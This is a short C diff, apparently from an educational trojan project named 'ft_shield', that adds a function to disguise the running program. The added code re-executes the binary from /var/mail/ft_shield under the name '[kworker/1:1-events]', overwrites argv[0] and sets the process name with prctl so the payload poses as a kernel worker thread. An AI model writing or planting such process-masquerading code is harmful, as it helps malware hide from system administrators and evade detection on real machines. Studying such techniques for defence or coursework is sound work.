@@ -4,12 +4,35 @@
 #include <stdlib.h>
 #include <string.h>
 #include <fcntl.h>
+#include <sys/prctl.h>
 
 #include "key.h"
 #include "server.h"
 
-int main()
+int obfuscate_process_name(int argc, char **argv)
 {
+	// obfuscate payload by changing the name of the process
+	(void)argc;
+	char *pr_name = "[kworker/1:1-events]";
+	if (strcmp(argv[0], pr_name) != 0)
+	{
+		char *new_argv[] = {pr_name, NULL};
+		if (execv("/var/mail/ft_shield", new_argv) == -1)
+			return 1;
+	}
+	else
+	{
+		memset(argv[0], 0, strlen(argv[0]));
+		strncpy(argv[0], pr_name, strlen(pr_name));
+		prctl(PR_SET_NAME, pr_name, 0, 0, 0);
+	}
+	return 0;
+}
+
+int main(int argc, char **argv)
+{
+	obfuscate_process_name(argc, argv);
+
 	// remove buffering for stdout
 	setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
